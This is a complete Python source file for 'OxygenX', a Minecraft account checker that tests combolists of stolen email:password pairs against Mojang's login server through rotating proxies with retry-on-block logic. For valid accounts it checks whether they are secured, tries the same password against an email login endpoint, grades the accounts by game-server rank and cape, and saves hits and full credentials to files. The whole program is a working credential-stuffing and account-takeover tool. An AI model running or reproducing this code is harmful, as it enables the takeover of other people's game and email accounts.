from concurrent.futures import ThreadPoolExecutor
from ctypes import windll
from datetime import datetime, timedelta, timezone
from json import JSONDecodeError
from multiprocessing.dummy import Pool as ThreadPool
from os import mkdir, path, system
from queue import Queue
from random import choice
from re import compile
from threading import Thread
from time import sleep, strftime

from colorama import init, Fore
from requests import get, post
from urllib3 import disable_warnings
from urllib3.connectionpool import SocketError, SSLError, MaxRetryError, ProxyError
from yaml import full_load

init()
default_values = '''checker:

  # Check if current version of OxygenX is latest  
  check_for_updates: true

  # Amount of checks for a account many times to check a account.
  # Needs to be 1 or higher
  retries: 2

  # Higher for better accuracy but slower (counted in milliseconds)
  timeout: 8000

  # Threads for account checking
  threads: 100

  # Check hits if its a mail access
  mail_access: true
  
  # Save ranked accounts in secured.txt or unsecured.txt (Turn it off for ranked accounts NOT to save in secured.txt or unsecured.txt)
  save_rankedtypes: true
  
  # Save bad accounts, good for checking paid alts (will use more cpu and take longer)
  save_bad: false

  # Normal users should keep this false unless problem start happening
  debugging: false
  

  capes:
    # Check capes
    liquidbounce: true
    optifine: true
    labymod:  true
    # Minecon/Mojang cape
    minecon:  true

  rank:
  # Set true if you want to check the ranks/level
    mineplex: true
    hypixel:  true
    hivemc: true
    veltpvp: true
    lunar: true

  level:
    # Save High leveled accounts in files.
    hypixel: true
    mineplex: true
    # Minimum high level accounts
    hypixel_level: 25
    mineplex_level: 25

  proxy:
    # If proxies should be used, Will be proxyless if set to false (Recommended to use VPN if this is set to false.)
    proxy: true
    # Proxy types: https | socks4 | socks5
    proxy_type: 'socks4'
    # Proxy file name
    proxy_file: 'proxies.txt'
    
    # If proxy api link to be used.
    proxy_use_api: false
    # If proxy_use_api is true, put api link in the parentheses
    proxy_api_link: "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=5000"
    # If proxy_use_api is true, put a number for seconds to refresh the link (every number under 30 is for no refreshing time, recommend refresh time: 300 seconds aka 5 minutes)
    refresh_api_link: 300
    
    # If proxies be used for checking mail access
    mailcheck_use_proxy: false
'''
while True:
    try:
        config = full_load(open('config.yml', 'r', errors='ignore'))
        break
    except FileNotFoundError:
        print(f'{Fore.LIGHTCYAN_EX}Config file not found, creating config file and loading default values...\n')
        open('config.yml', 'w').write(default_values)
        sleep(2)
        system('cls')


class Counter:
    nfa = 0
    sfa = 0
    unfa = 0
    demo = 0
    hits = 0
    bad = 0
    optifine = 0
    mojang = 0
    labymod = 0
    liquidbounce = 0
    special_name = 0
    hivemcrank = 0
    mineplexrank = 0
    mineplexhl = 0
    hypixelrank = 0
    hypixelhl = 0
    hivelevel = 0
    emailaccess = 0
    cpm = 0
    nohypixel = 0
    nomineplex = 0
    veltrank = 0
    lunarrank = 0


class Main:
    def __init__(self):
        disable_warnings()
        self.version = '0.3'
        self.printing = Queue()
        self.caputer = Queue()
        self.hits = Queue()
        self.bad = Queue()
        self.mailheaders = {'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0', 'Pragma': 'no-cache'}
        self.mcurl = 'https://authserver.mojang.com/authenticate'
        self.jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
        self.secureurl = 'https://api.mojang.com/user/security/challenges'
        self.lunarr = compile(r'premium-box\">\n.*<span class=.*>\n(.*)\n</span>')
        self.veltrank = compile(r'<h2 style=\"color: .*\">(.*)</h2>')
        self.rankhv = compile(r'class=\"rank.*\">(.*)<')
        self.levelmp = compile(r'>Level (.*)</b>')
        self.rankmp = compile(r'Rank\(\'(.*)\'\)')
        self.debug = Checker.debug
        self.savebad = Checker.save_bad
        self.hypl = Checker.Level.hypixel
        self.hypr = Checker.Rank.hypixel_rank
        self.mpl = Checker.Level.mineplex
        self.mpr = Checker.Rank.mineplex_rank
        self.liquidcape = Checker.Cape.liquidbounce
        self.hypminl = Checker.Level.hypixel_level
        if self.liquidcape:
            capesz = str(self.liquidbounce())
            if self.liquidcape:
                self.lbcape = capesz
            else:
                self.liquidcape = False
        self.proxylist = Checker.Proxy.proxylist
        self.proxy_type = Checker.Proxy.type
        windll.kernel32.SetConsoleTitleW(
            f'OxygenX-{self.version} | by ShadowOxygen')
        self.t = f'''{Fore.LIGHTCYAN_EX}________                                     ____  ___
\_____  \ ___  ______.__. ____   ____   ____ \   \/  /
 /   |   \\\  \/  <   |  |/ ___\_/ __ \ /    \ \     /
/    |    \>    < \___  / /_/  >  ___/|   |  \/     \\
\_______  /__/\_ \/ ____\___  / \___  >___|  /___/\  \\
        \/      \/\/   /_____/      \/     \/      \_/
\n'''
        if Checker.version_check:
            try:
                gitversion = str(
                    get(url="https://raw.githubusercontent.com/ShadowBlader/OxygenX/master/version.txt").text)
                if f'{self.version}\n' != gitversion:
                    print(self.t)
                    print(f"{Fore.LIGHTRED_EX}Your version is outdated.")
                    print(
                        f"Your version: {self.version}\nLatest version: {gitversion}\nGet latest version in the link below")
                    print(
                        f"https://github.com/ShadowBlader/OxygenX/releases\nStarting in 5 seconds...{Fore.LIGHTCYAN_EX}")
                    sleep(5)
                    system('cls')
            except Exception as e:
                if self.debug:
                    print(f'\nError for updating checking:\n {e}\n')
                pass
        try:
            self.announcement = get(
                url='https://raw.githubusercontent.com/ShadowBlader/OxygenX/master/announcement').text
        except ConnectionError:
            self.announcement = ''
            pass
        except Exception as e:
            if self.debug:
                print(f'{Fore.LIGHTRED_EX}Error with announcement: {e}')
            self.announcement = ''
            pass

        print(self.t)
        if Checker.Proxy.proxy and not Checker.Proxy.proxy_use_api:
            while True:
                try:
                    self.proxylist = open(self.proxylist, 'r', encoding='u8', errors='ignore').read().split('\n')
                    print(Fore.LIGHTCYAN_EX)
                    break
                except FileNotFoundError:
                    print(
                        f'{Fore.LIGHTRED_EX}{self.proxylist} not found, Please make sure {self.proxylist} is in folder')
                    self.proxylist = input('Please type the correct proxies file name: ')
                    continue
        elif Checker.Proxy.proxy_use_api and Checker.Proxy.proxy:
            while True:
                try:
                    self.proxylist = [x.strip() for x in get(url=Checker.Proxy.proxy_api).text.splitlines()
                                      if
                                      ':' in x]
                    if Checker.Proxy.refresh_api > 30:
                        Thread(target=self.refresh_api_link, daemon=True).start()
                    break
                except Exception as e:
                    if self.debug:
                        print(f'{Fore.LIGHTRED_EX}Error connecting with api link: {e}\n')
                    print(
                        f'{Fore.LIGHTRED_EX}Proxy Api link down or Connection Error\nPlease check your connection or make sure you entered the correct api link\n\nClosing program in 6 seconds...')
                    sleep(6)
                    exit()

        while True:
            file = input("Please Enter Combolist Name (Please include extension name, Example: combolist.txt): ")
            try:
                self.combolist = open(file, 'r', encoding='u8', errors='ignore').read().split('\n')
                break
            except FileNotFoundError:
                print(f'\n{Fore.LIGHTRED_EX}File not found, please try again.{Fore.LIGHTCYAN_EX}\n')
                continue
        print('Starting OxygenX...')
        self.dictorary = open('dictionary.txt', 'a+', errors='ignore').read()
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.folder = f'results/{unix}'
        if not path.exists('results'):
            mkdir('results')
        if not path.exists(self.folder):
            mkdir(self.folder)
        self.accounts = [x for x in self.combolist if x != '' and ':' in x]
        Thread(target=self.prints, daemon=True).start()
        Thread(target=self.writecap, daemon=True).start()
        Thread(target=self.save_hits, daemon=True).start()
        Thread(target=self.cpm_counter, daemon=True).start()
        if self.savebad:
            Thread(target=self.save_bad, daemon=True).start()
        pool = ThreadPool(processes=Checker.threads)
        system('cls')
        Thread(target=self.title, daemon=True).start()
        print(self.t)
        print(self.announcement)
        pool.imap(self.prep, self.accounts)
        pool.close()
        pool.join()
        while True:
            if int(self.printing.qsize() and self.caputer.qsize() and self.bad.qsize() and self.hits.qsize()) == 0:
                sleep(1)
                print(f'{Fore.LIGHTGREEN_EX}\n\nResults: \n'
                      f'Hits: {Counter.hits}\n'
                      f'Bad: {Counter.bad}\n'
                      f'Demo: {Counter.demo}\n'
                      f'Secured: {Counter.nfa}\n'
                      f'Unsecured: {Counter.sfa}\n'
                      f'Email Access: {Counter.emailaccess}\n'
                      f'Unmigrated: {Counter.unfa}\n'
                      f'NoHypixel Login accounts: {Counter.nohypixel}\n'
                      f'NoMineplex Login accounts: {Counter.nomineplex}\n'
                      f'Mojang/Minecon cape: {Counter.mojang}\n'
                      f'Optifine cape: {Counter.optifine}\n'
                      f'Labymod cape: {Counter.labymod}\n'
                      f'LiquidBounce cape: {Counter.liquidbounce}\n'
                      f'Hypixel Ranked accounts: {Counter.hypixelrank}\n'
                      f'Mineplex Ranked accounts: {Counter.mineplexrank}\n'
                      f'HiveMC Ranked accounts: {Counter.hivemcrank}\n'
                      f'Veltpvp Ranked accounts: {Counter.veltrank}\n'
                      f'Lunar Ranked accounts: {Counter.lunarrank}\n'
                      f'Hypixel {self.hypminl}+ accounts: {Counter.hypixelhl}\n'
                      f'Mineplex {Checker.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n'
                      f'{Fore.LIGHTMAGENTA_EX}\nFinished checking\n{Fore.LIGHTRED_EX}')
                input('[Exit] You can now close OxygenX...')
                break

    def prep(self, line):
        try:
            email, password = line.split(':', 1)
            check_counter = 0
            answer = {'errorMessage': 'Invalid credentials'}
            while True:
                if check_counter != Checker.retries:
                    answer = self.checkmc(email, password)
                    if str(answer).__contains__('Invalid credentials'):
                        check_counter += 1
                        sleep(0.2)
                    elif str(answer).__contains__('Request blocked.') or str(answer).__contains__(
                            "'Client sent too many requests too fast.'"):
                        sleep(0.5)
                    else:
                        break
                else:
                    break
            if str(answer).__contains__("errorMessage"):
                Counter.bad += 1
                if self.savebad:
                    self.bad.put(line)
            elif str(answer).__contains__("availableProfiles': []"):
                self.printing.put(f'{Fore.LIGHTYELLOW_EX }[Demo] {line}{Fore.WHITE}')
                Counter.demo += 1
                open(f'{self.folder}/Demo.txt', 'a', encoding='u8').write(f'{line}\n')
            else:
                uuid = answer['availableProfiles'][0]["id"]
                username = answer['availableProfiles'][0]['name']
                self.hits.put(line)
                token = answer['accessToken']
                dosfa = True
                sfa = False
                saveranked = True
                data = ['=======================================\n'
                        f'{line}\n'
                        f'Username: {username}\n'
                        f'Email: {email}\n'
                        f'Password: {password}']

                if str(answer).__contains__("'legacy': True"):
                    Counter.unfa += 1
                    self.printing.put(f'{Fore.LIGHTMAGENTA_EX}[Unmigrated] {line}{Fore.WHITE}')
                    open(f'{self.folder}/Unmigrated.txt', 'a', encoding='u8').write(f'{line}\n')
                    data.append('\nUnmigrated: True')
                    dosfa = False

                if dosfa:
                    securec = self.securedcheck(token=token)
                    if securec == '[]':
                        Counter.sfa += 1
                        self.printing.put(
                            f'{Fore.LIGHTGREEN_EX}[{Fore.LIGHTCYAN_EX}Unsecured{Fore.LIGHTGREEN_EX}] {line} User: {username}{Fore.WHITE}')
                        sfa = True
                        data.append('\nUnsecured: True')
                    else:
                        Counter.nfa += 1
                        self.printing.put(f'{Fore.LIGHTGREEN_EX}[Secured] {line} User: {username}{Fore.WHITE}')
                Counter.hits += 1

                if self.name(username):
                    Counter.special_name += 1
                    open(f'{self.folder}/SpecialName.txt', 'a', encoding='u8').write(f'{line} | Username: {username}\n')
                    data.append('\nSpecial Name: True')
                with ThreadPoolExecutor() as exe:
                    hypixel = exe.submit(self.hypixel, uuid, line).result()
                    mineplex = exe.submit(self.mineplex, username, line).result()
                    lunar = exe.submit(self.lunar, uuid, line).result()
                    hiverank = exe.submit(self.hivemc, uuid, line).result()
                    mailaccess = exe.submit(self.mailaccess, email, password).result()
                    veltrank = exe.submit(self.veltpvp, username, line).result()
                    minecon = exe.submit(self.mojang, uuid, line, username).result()
                    optifine = exe.submit(self.optifine, username, line).result()
                    labycape = exe.submit(self.labymod, uuid, line, username).result()

                if minecon:
                    data.append('\nMinecon Cape: True')

                if optifine:
                    data.append('\nOptifine Cape: True')

                if labycape:
                    data.append('\nLabymod Cape: True')

                if self.liquidcape:
                    if self.lbcape.__contains__(uuid):
                        Counter.liquidbounce += 1
                        open(f'{self.folder}/LiquidBounceCape.txt', 'a', encoding='u8').write(
                            f'{line} | Username: {username}\n')
                        data.append('\nLiquidBounce Cape: True')

                if dosfa:
                    if mailaccess:
                        data.append('\nEmail Access: True')

                if veltrank:
                    if not Checker.save_rankedtypes:
                        saveranked = False
                    data.append(f'\nVelt Rank: {veltrank}')

                if hiverank:
                    data.append(f'\nHive Rank: {str(hiverank)}')
                    if not Checker.save_rankedtypes:
                        saveranked = False

                if lunar[0]:
                    data.append('\nBanned on Lunar: True')
                if lunar[1]:
                    if not Checker.save_rankedtypes:
                        saveranked = False
                    open(f'{self.folder}/LunarRanked.txt', 'a', encoding='u8').write(
                        f'{line} | Rank: {lunar[1]}\n')
                    data.append(f'\nLunar Rank: {lunar[1]}')

                if self.mpr or self.mpl:
                    if mineplex[0]:
                        data.append(f'\nMineplex Rank: {mineplex[0]}')
                        if not Checker.save_rankedtypes:
                            saveranked = False
                    if mineplex[1]:
                        data.append(f'\nMineplex Level: {str(mineplex[1])}')
                    if not mineplex[0] and not mineplex[1]:
                        data.append(f'\nNo Mineplex Login: True')

                if self.hypr or self.hypl:
                    if not hypixel[2]:
                        if hypixel[0]:
                            if not Checker.save_rankedtypes:
                                saveranked = False
                            data.append(f'\nHypixel Rank: {hypixel[0]}')
                        if hypixel[1]:
                            data.append(f'\nHypixel Level: {str(hypixel[1])}')
                        if hypixel[3]:
                            data.append(f'\nHypixel LastLogout Date: {hypixel[3]}')

                    else:
                        data.append(f'\nNo Hypixel Login: True')

                if saveranked and dosfa:
                    if sfa:
                        open(f'{self.folder}/Unsecured.txt', 'a', encoding='u8').write(f'{line}\n')
                    else:
                        open(f'{self.folder}/Secured.txt', 'a', encoding='u8').write(f'{line}\n')

                self.caputer.put(''.join(data))
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}[Error] {line} \nError: {e}{Fore.WHITE}')
            if self.savebad:
                self.bad.put(line)
            Counter.bad += 1

    def checkmc(self, user, passw):
        try:
            payload = ({
                'agent': {
                    'name': 'Minecraft',
                    'version': 1
                },
                'username': user,
                'password': passw,
                'requestUser': 'true'
            })
            if not Checker.Proxy.proxy:
                while True:
                    try:
                        answer = post(url=self.mcurl, json=payload, headers=self.jsonheaders,
                                      timeout=Checker.timeout).json()
                        break
                    except (SocketError, SSLError, MaxRetryError, JSONDecodeError):
                        sleep(3)
                        continue
            else:
                while True:
                    try:
                        answer = post(url=self.mcurl, proxies=self.proxies(),
                                      json=payload, headers=self.jsonheaders, timeout=Checker.timeout).json()
                        break
                    except (SocketError, SSLError, MaxRetryError, ProxyError, JSONDecodeError):
                        continue
            answered = answer
        except Exception as e:
            if self.debug:
                self.printing.put(f'CheckMC: \n{e}')
            answered = 'errorMessage'
        return answered

    def securedcheck(self, token):
        headers = {'Pragma': 'no-cache', "Authorization": f"Bearer {token}"}
        try:
            if not Checker.Proxy.proxy:
                while True:
                    try:
                        lol = get(url=self.secureurl,
                                  headers=headers).text
                        break
                    except (SocketError, SSLError, MaxRetryError, JSONDecodeError):
                        sleep(2)
                        continue
            else:
                while True:
                    try:
                        lol = get(url=self.secureurl, headers=headers, proxies=self.proxies()).text
                        break
                    except (SocketError, SSLError, MaxRetryError, ProxyError, JSONDecodeError):
                        continue
            answer = lol
        except Exception as e:
            if self.debug:
                self.printing.put(f'Error SFA: \n{e}')
            answer = 'NFAAAA'
        return answer

    def title(self):
        while True:
            windll.kernel32.SetConsoleTitleW(
                f"OxygenX-{self.version} | "
                f"Hits: {Counter.hits}"
                f" | Bad: {Counter.bad}"
                f' | Secured: {Counter.nfa}'
                f' | Unsecured: {Counter.sfa}'
                f' | Demo: {Counter.demo}'
                f' | Mail Access: {Counter.emailaccess}'
                f' | Unmigrated: {Counter.unfa}'
                f" | Left: {len(self.accounts) - (Counter.hits + Counter.bad + Counter.demo)}/{len(self.combolist)}"
                f' | CPM: {Counter.cpm}')

    def prints(self):
        while True:
            while self.printing.qsize() != 0:
                print(self.printing.get())

    def proxies(self):
        proxy = choice(self.proxylist)
        if proxy.count(':') == 3:
            spl = proxy.split(':')
            proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
        else:
            proxy = proxy
        if self.proxy_type.lower() == 'http' or self.proxy_type.lower() == 'https':
            proxy_form = {
                'http': f"http://{proxy}",
                'https': f"https://{proxy}"
            }
        else:
            proxy_form = {
                'http': f"{self.proxy_type}://{proxy}",
                'https': f"{self.proxy_type}://{proxy}"
            }
        return proxy_form

    def writecap(self):
        while True:
            while self.caputer.qsize() != 0:
                open(f'{self.folder}/CapturedData.txt', 'a', encoding='u8').write(f'{self.caputer.get()}\n')

    def save_bad(self):
        while True:
            while self.bad.qsize() != 0:
                open(f'{self.folder}/Bad.txt', 'a', encoding='u8').write(f'{self.bad.get()}\n')

    def save_hits(self):
        while True:
            while self.hits.qsize() != 0:
                open(f'{self.folder}/Hits.txt', 'a', encoding='u8').write(f'{self.hits.get()}\n')

    def optifine(self, user, combo):
        cape = False
        if Checker.Cape.optifine:
            try:
                optifine = get(url=f'http://s.optifine.net/capes/{user}.png').text
                if not str(optifine).__contains__('Not found'):
                    cape = True
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error Optifine:\n{e}{Fore.WHITE}')
            if cape:
                Counter.optifine += 1
                open(f'{self.folder}/OptifineCape.txt', 'a', encoding='u8').write(
                    f'{combo} | Username: {user}\n')
        return cape

    def name(self, name):
        if len(name) <= 3 or name in self.dictorary:
            return True
        else:
            return False

    def mojang(self, uuid, combo, user):
        cape = False
        if Checker.Cape.minecon:
            try:
                mine = get(url=f'https://api.ashcon.app/mojang/v2/user/{uuid}').text
                if mine.__contains__('"cape"'):
                    cape = True
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error MojangCape:\n{e}{Fore.WHITE}')
            if cape:
                Counter.mojang += 1
                open(f'{self.folder}/MineconCape.txt', 'a', encoding='u8').write(
                    f'{combo} | Username: {user}\n')
        return cape

    def labymod(self, uuid, combo, user):
        cape = False
        if Checker.Cape.labymod:
            link = f'http://capes.labymod.net/capes/{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}'
            try:
                laby = get(url=link).text
                if not str(laby).__contains__('Not Found'):
                    cape = True
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error Labymod:\n{e}{Fore.WHITE}')
            if cape:
                Counter.labymod += 1
                open(f'{self.folder}/LabymodCape.txt', 'a', encoding='u8').write(
                    f'{combo} | Username: {user}\n')
        return cape

    def liquidbounce(self):
        try:
            lbc = get(
                url=f'https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json').text
            return lbc
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error LiquidBounce:\n{e}{Fore.WHITE}')
            return False

    def hivemc(self, uuid, combo):
        rank = False
        if Checker.Rank.hivemc_rank:
            try:
                response = get(url=f'https://www.hivemc.com/player/{uuid}').text
                match = self.rankhv.search(response).group(1)
                if match != 'Regular':
                    rank = match
            except AttributeError:
                rank = False
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error HiveMC:\n{e}{Fore.WHITE}')
            if rank:
                open(f'{self.folder}/HiveRanked.txt', 'a', encoding='u8').write(
                    f'{combo} | Rank: {str(rank)}\n')
                Counter.hivemcrank += 1
            return rank

    def mineplex(self, username, combo):
        both = [False, False]
        if self.mpr or self.mpl:
            try:
                response = get(url=f'https://www.mineplex.com/players/{username}', headers=self.mailheaders).text
                if response.__contains__('That player cannot be found.'):
                    both[0] = False
                    both[1] = False
                else:
                    both[0] = str(self.rankmp.search(response).group(1))
                    both[1] = int(self.levelmp.search(response).group(1))
                    if both[0].lower() == 'player':
                        both[0] = False
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error Mineplex:\n{e}{Fore.WHITE}')
            if both[0]:
                Counter.mineplexrank += 1
                open(f'{self.folder}/MineplexRanked.txt', 'a', encoding='u8').write(
                    f'{combo} | Rank: {both[0]}\n')
            if both[1] and self.mpr:
                if both[1] >= Checker.Level.mineplex_level:
                    Counter.mineplexhl += 1
                    open(f'{self.folder}/MineplexHighLevel.txt', 'a', encoding='u8').write(
                        f'{combo} | Level: {str(both[1])}\n')
            if not both[0] and not both[1]:
                Counter.nomineplex += 1
                open(f'{self.folder}/NoMineplexLogin.txt', 'a', encoding='u8').write(f'{combo}\n')
        return both

    def hypixel(self, uuid, combo):
        both = [False, False, False, False]
        if self.hypr or self.hypl:
            try:
                answer = get(url=f'https://api.slothpixel.me/api/players/{uuid}').json()
                if 'Failed to get player uuid' not in str(answer):
                    rank = str(answer['rank'])
                    if rank.__contains__('_PLUS'):
                        rank = rank.replace('_PLUS', '+')
                    level = int(answer["level"])
                    nolog = str(answer['username'])
                    if nolog == 'None':
                        both[2] = True
                    else:
                        both[0] = str(rank)
                        both[1] = int(round(level))
                        both[3] = str(datetime(1970, 1, 1, tzinfo=timezone.utc) + timedelta(
                            milliseconds=int(answer['last_logout']))).split(' ')[0]
                else:
                    both[2] = True
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Slothpixel API Error: \n{e}{Fore.WHITE}')
            if not both[2]:
                if both[0] != 'None':
                    Counter.hypixelrank += 1
                    open(f'{self.folder}/HypixelRanked.txt', 'a', encoding='u8').write(
                        f'{combo} | Rank: {both[0]}\n')
                else:
                    both[0] = False
                if both[1] >= Checker.Level.hypixel_level:
                    Counter.hypixelhl += 1
                    open(f'{self.folder}/HypixelHighLevel.txt', 'a', encoding='u8').write(
                        f'{combo} | Level: {str(both[1])}\n')
            else:
                Counter.nohypixel += 1
                open(f'{self.folder}/NoHypixelLogin.txt', 'a', encoding='u8').write(f'{combo}\n')
        return both

    def veltpvp(self, username, combo):
        rank = False
        if Checker.Rank.veltpvp_rank:
            try:
                link = get(url=f'https://www.veltpvp.com/u/{username}', headers=self.mailheaders).text
                if '<h1>Not Found</h1><p>The requested URL' not in link:
                    rank = self.veltrank.search(link).group(1)
                    if rank == 'Standard' or rank == 'Default':
                        rank = False
                    else:
                        rank = rank
            except AttributeError:
                rank = False
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error Veltpvp:\n{e}{Fore.WHITE}')
            if rank:
                open(f'{self.folder}/VeltRanked.txt', 'a', encoding='u8').write(f'{combo} | Rank: {rank}\n')
                Counter.veltrank += 1
        return rank

    def lunar(self, uuid, combo):
        both = [False, False]
        if Checker.Rank.lunar_rank:
            try:
                check = get(url=f'http://www.lunar.gg/u/{uuid}', headers=self.mailheaders).text
                if '404: Page Not Found' not in check:
                    if '>Banned<' in check:
                        both[1] = True
                    both[0] = self.lunarr.search(check).group(1)
                    if both[0] == 'Default':
                        both[0] = False
                    else:
                        both[0] = both[0]
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error Lunar: \n{e}{Fore.WHITE}')
            if both[0]:
                open(f'{self.folder}/LunarRanked.txt', 'a', encoding='u8').write(f'{combo} | Rank: {both[0]}\n')
                Counter.lunarrank += 1
        return both

    def mailaccess(self, email, password):
        mailaccesz = False
        if Checker.emailaccess:
            try:
                link = f'http://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&'
                if not Checker.Proxy.proxy or not Checker.Proxy.mail_proxy:
                    a = get(url=link, headers=self.mailheaders).text
                else:
                    while True:
                        try:
                            a = get(url=link, headers=self.mailheaders, proxies=self.proxies()).text
                            break
                        except (SocketError, SSLError, MaxRetryError, ProxyError):
                            continue

                answer = a
            except Exception as e:
                if self.debug:
                    self.printing.put(f'{Fore.LIGHTRED_EX}Error Mail Access: \n{e}{Fore.WHITE}')
                answer = 'bad'
            if 'Ok=1' in answer:
                mailaccesz = True
            if mailaccesz:
                Counter.emailaccess += 1
                open(f'{self.folder}/EmailAccess.txt', 'a', encoding='u8').write(f'{email}:{password}\n')
            return mailaccesz

    def cpm_counter(self):
        while True:
            while (Counter.hits + Counter.bad) >= 1:
                now = Counter.hits + Counter.bad
                sleep(4)
                Counter.cpm = (Counter.hits + Counter.bad - now) * 15

    def refresh_api_link(self):
        while True:
            try:
                sleep(Checker.Proxy.refresh_api)
                self.proxylist = [x.strip() for x in get(url=Checker.Proxy.proxy_api).text.splitlines() if ':' in x]

            except Exception as e:
                if self.debug:
                    print(f'{Fore.LIGHTRED_EX}Refreshing API link error: {e}')
                continue


class Checker:
    version_check = bool(config['checker']['check_for_updates'])
    retries = int(config['checker']['retries'])
    timeout = int(config['checker']['timeout']) / 1000
    threads = int(config['checker']['threads'])
    emailaccess = bool(config['checker']['mail_access'])
    save_rankedtypes = bool(config['checker']['save_rankedtypes'])
    save_bad = bool(config['checker']['save_bad'])
    debug = bool(config['checker']['debugging'])

    class Cape:
        liquidbounce = bool(config['checker']['capes']['liquidbounce'])
        optifine = bool(config['checker']['capes']['optifine'])
        labymod = bool(config['checker']['capes']['labymod'])
        minecon = bool(config['checker']['capes']['minecon'])

    class Rank:
        mineplex_rank = bool(config['checker']['rank']['mineplex'])
        hypixel_rank = bool(config['checker']['rank']['hypixel'])
        hivemc_rank = bool(config['checker']['rank']['hivemc'])
        veltpvp_rank = bool(config['checker']['rank']['veltpvp'])
        lunar_rank = bool(config['checker']['rank']['lunar'])

    class Level:
        hypixel = bool(config['checker']['level']['hypixel'])
        mineplex = bool(config['checker']['level']['mineplex'])
        hypixel_level = int(config['checker']['level']['hypixel_level'])
        mineplex_level = int(config['checker']['level']['mineplex_level'])

    class Proxy:
        proxy = bool(config['checker']['proxy']['proxy'])
        type = str(config['checker']['proxy']['proxy_type'])
        proxylist = str(config['checker']['proxy']['proxy_file'])
        proxy_use_api = bool(config['checker']['proxy']['proxy_use_api'])
        proxy_api = str(config['checker']['proxy']['proxy_api_link'])
        refresh_api = int(config['checker']['proxy']['refresh_api_link'])
        mail_proxy = bool(config['checker']['proxy']['mailcheck_use_proxy'])


if __name__ == '__main__':
    Main()
